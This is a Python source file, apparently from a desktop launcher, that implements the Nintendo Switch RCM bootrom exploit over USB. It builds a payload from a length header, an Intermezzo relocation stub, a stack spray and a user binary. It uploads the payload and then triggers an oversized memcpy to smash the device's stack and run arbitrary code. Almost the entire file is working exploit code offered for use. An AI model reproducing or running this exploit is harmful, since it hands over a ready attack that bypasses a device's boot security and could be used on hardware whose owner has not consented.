"""
 * Written by the Trapdoor-NX team, May 8, 2018.
 * Licensing information can found in the 'LICENSE' file.
 * Injector based on reswitched/fusee-launcher.
"""

import threading
import tkinter
import platform
import usb
from launcher.globals import InjectorGlobals
from launcher.injector.IWindowsInjector import IWindowsInjector
from launcher.injector.IDarwinInjector import IDarwinInjector
from launcher.injector.ILinuxInjector import ILinuxInjector

class PayloadInjector(threading.Thread):

	def __init__(self, parent):
		threading.Thread.__init__(self)

		self.parent = parent
		self.nativeInjector = None

		# Injector specific vars.
		self.currentBuffer = 0
		self.usbDevice = None
		self.totalWritten = 0

		self.start()

	def reset(self):
		self.currentBuffer = 0
		self.usbDevice = None
		self.totalWritten = 0

	def shutdown(self):
		pass

	def run(self):
		# Native injector interface. OS specific.
		osName = platform.system()

		if osName == 'Windows':
			self.nativeInjector = IWindowsInjector(self)

		# MacOS.
		elif osName == 'Darwin':
			self.nativeInjector = IDarwinInjector(self)

		elif osName == 'Linux':
			self.nativeInjector = ILinuxInjector(self)

		else:
			print("Running on an unknown OS... Defaulting to Linux.")
			self.nativeInjector = ILinuxInjector()

	def runInjector(self):
		"""
		Run the injector.
		"""

		intermezzoPath = self.parent.intermezzoPath
		payloadPath = self.parent.payloadPath

		if not intermezzoPath or not payloadPath:
			print("Error: You must set both an Intermezzo path and a Payload path!")
			self.processError('VarsNotSet')
			return

		# Get a connection to the (possibly) connected Nintendo Switch.
		try:
			self.usbDevice = self.findUSBDevice()

		# Incase the libusb native hasn't been installed.
		except usb.core.NoBackendError as backendError:
			print(backendError)
			self.processError('NoBackend')
			return

		if self.usbDevice is None:
			print("Error: Unable to locate connected Nintendo Switch...")
			self.processError('UnableToLocate')
			return

		# Retrieve and print the device's ID.
		# NOTE: We have to read the first 16 anyways before we can proceed.
		deviceID = self.readDeviceID()
		print("Nintendo Switch with device ID: (%s) located!" % deviceID)
		self.parent.gui.setDeviceID(deviceID)

		# Use the maximum length accepted by RCM, so we can transmit as much payload as
		# we want; we'll take over before we get to the end.
		# Little endian byteorder.
		length = 0x30298
		payload = length.to_bytes(4, byteorder='little')

		# Pad out to 680 so the payload starts at the right address in IRAM.
		payload += b'\0' * (680 - len(payload))

		# Populate from [RCM_PAYLOAD_ADDR, INTERMEZZO_LOCATION] with the payload address.
		# We'll use this data to smash the stack when we execute the vulnerable memcpy.
		print("Getting ready to smash the stack...")

		# Include the Intermezzo binary in the command stream. This is our first-stage
		# payload, and it's responsible for relocating the final payload to 0x40010000.
		intermezzoSize = 0
		with open(intermezzoPath, "rb") as f:
			intermezzo = f.read()
			intermezzoSize = len(intermezzo)
			payload += intermezzo

		# Pad the payload till the start of the user payload.
		paddingSize = InjectorGlobals.PAYLOAD_START_ADDR - (InjectorGlobals.RCM_PAYLOAD_ADDR + intermezzoSize)
		payload += (b'\0' * paddingSize)

		# Read the user payload into memory.
		targetPayload = b''
		with open(payloadPath, "rb") as f:
			targetPayload = f.read()

		# Fit a collection of the payload before the stack spray.
		paddingSize = InjectorGlobals.STACK_SPRAY_START - InjectorGlobals.PAYLOAD_START_ADDR
		payload += targetPayload[:paddingSize]

		# Insert the stack spray...
		repeatCount = int((InjectorGlobals.STACK_SPRAY_END - InjectorGlobals.STACK_SPRAY_START) / 4)
		payload += (InjectorGlobals.RCM_PAYLOAD_ADDR.to_bytes(4, byteorder='little') * repeatCount)

		# ...and follow the stack spray with the remainder of the payload.
		payload += targetPayload[paddingSize:]

		# Pad the payload to fill a USB request exactly, so we don't send a short
		# packet and break out of the RCM loop.
		payloadLength = len(payload)
		paddingSize = 0x1000 - (payloadLength % 0x1000)
		payload += (b'\0' * paddingSize)

		# Check to see if our payload packet will fit inside the RCM high buffer.
		# If it won't, error out.
		if len(payload) > length:
			sizeOver = len(payload) - length
			print("Error: Payload is too large to be submitted via RCM. ((%s) bytes larger than max)." % sizeOver)
			self.processError('PayloadTooBig')
			return

		# Send the constructed payload which contains: the command, stack smashing values,
		# Intermezzo relocation stub, and the final payload.
		print("Uploading payload...")
		self.write(payload)

		# The RCM backend alternates between two different DMA buffers. Ensure we're
		# about to DMA into the higher one, so we have less to copy during our attack.
		self.switchToHighBuff()

		# Smash the device's stack, triggering the vulnerability.
		print("Smashing the stack...")

		try:
			self.triggerControlledMemcpy()

		# This isn't an error! We've made the device stop responding.
		# (Unless they've unplugged it, we've injected the payload and triggered the exploit).
		except IOError:
			print("Lost connection to the Switch... (THIS IS NOT AN ERROR! Unless you've unplugged it).")
			print("SUCCESS! The exploit has been triggered and you can now safely unplug your Switch!")
			self.processInfo('SuccessfulExploit')
			return

		# Any other exception is unknown.
		except Exception as e:
			print(e)
			print("Error: An unknown error occured while triggering the exploit...")
			self.processError('UnknownError')
			return

	def read(self, length):
		"""
		Reads data from the RCM protocol endpoint.
		"""
		if self.usbDevice is None:
			print("Warning: Attempted to read data from unresolved usb device.")
			return ''

		return self.usbDevice.read(0x81, length, 1000)

	def write(self, data):
		"""
		Writes data to the main RCM protocol endpoint.
		"""
		length = len(data)
		packetSize = 0x1000

		while length:
			dataToTransmit = min(length, packetSize)
			length -= dataToTransmit

			chunk = data[:dataToTransmit]
			data = data[dataToTransmit:]

			self.writeSingleBuffer(chunk)

	def writeSingleBuffer(self, data):
		"""
		Writes a single RCM buffer, which should be 0x1000 long.
		The last packet may be shorter, and should trigger a ZLP (e.g. not divisible by 512).
		If it's not, send a ZLP.
		"""
		self.toggleBuffer()

		return self.usbDevice.write(0x01, data, 1000)

	def toggleBuffer(self):
		"""
		Toggles the active target buffer, paralleling the operation happening in
		RCM on the X1 device.
		"""
		self.currentBuffer = 1 - self.currentBuffer

	def findUSBDevice(self, vid = None, pid = None):
		"""
		Attempts to get a connection to the RCM device with the given VID and PID.
		"""

		# Get the default VID (VendorID) and PID (ProductID) if they're not provided...
		vid = vid if vid else InjectorGlobals.DEFAULT_VID
		pid = pid if pid else InjectorGlobals.DEFAULT_PID

		# ... and use them to find a USB device.
		return usb.core.find(idVendor = vid, idProduct = pid)

	def readDeviceID(self):
		"""
		Reads the Device ID via RCM. Only valid at the start of the communication.
		"""
		return self.read(16)

	def getCurrentBufferAddress(self):
		"""
		Returns the base address for the current copy.
		"""
		return InjectorGlobals.COPY_BUFFER_ADDRESSES[self.currentBuffer]

	def switchToHighBuff(self):
		"""
		Switches to the higher RCM buffer, reducing the amount that needs to be copied.
		"""
		if self.getCurrentBufferAddress() != InjectorGlobals.COPY_BUFFER_ADDRESSES[1]:
			self.write(b'\0' * 0x1000)

	def triggerControlledMemcpy(self, length = None):
		"""
		Triggers the RCM vulnerability, causing it to make a signficantly-oversized memcpy.
		"""

		# Determine how much we would need to transmit to smash the full stack.
		if length is None:
			length = InjectorGlobals.STACK_END - self.getCurrentBufferAddress()

		return self.nativeInjector.triggerVulnerability(length)

	def processError(self, message):
		self.reset()
		self.parent.gui.popupError(message)
		self.parent.gui.returnInput()

	def processInfo(self, message):
		self.reset()
		self.parent.gui.popupInfo(message)
		self.parent.gui.returnInput()